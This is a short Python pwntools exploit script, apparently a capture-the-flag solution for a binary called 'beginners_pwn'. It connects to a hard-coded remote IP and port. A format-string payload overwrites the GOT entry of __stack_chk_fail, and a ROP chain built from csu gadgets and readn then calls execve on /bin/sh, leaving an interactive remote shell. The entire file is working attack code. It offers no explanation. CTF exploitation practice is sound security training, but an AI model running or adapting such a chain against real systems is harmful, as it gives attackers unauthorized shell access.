# exploit_beginners_pwn.py

from pwn import *

# r = process("./beginners_pwn")
r = remote("35.221.81.216", 30002)

stackchk_got = 0x404018 # GOT address of __stack_chk_fail()
main = 0x401255 # address of "leave; ret" in main()
pop_rdi = 0x4012c3 # address of "pop rdi; ret" gadget
pop_rsi_r15 = 0x4012c1 # address of "pop rsi; pop r15; ret" gadget
syscall = 0x40118f # address of "syscall" gadget
bss = 0x404100 # address of BSS section
readn = 0x401146 # address of readn()
csu1 = 0x4012ba
csu2 = 0x4012a0

payload = "%" + "s %7$d"
payload = payload.ljust(8, '\x00')
payload += p64(stackchk_got)

r.sendline(payload)

payload = "A" * 0x18

# ROP
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi_r15)
payload += p64(0x11)
payload += p64(0)
payload += p64(readn)
# rax == 0x3b

payload += p64(csu1)
payload += p64(0) # rbx
payload += p64(0) # rbp
payload += p64(bss) # rdi
payload += p64(0) # rsi
payload += p64(0) # rdx
payload += p64(bss + 8) # r15
payload += p64(csu2)

payload += " "
payload += str(main)

r.sendline(payload)

r.send("/bin/sh\x00" + p64(syscall) + "\x3b")

r.interactive()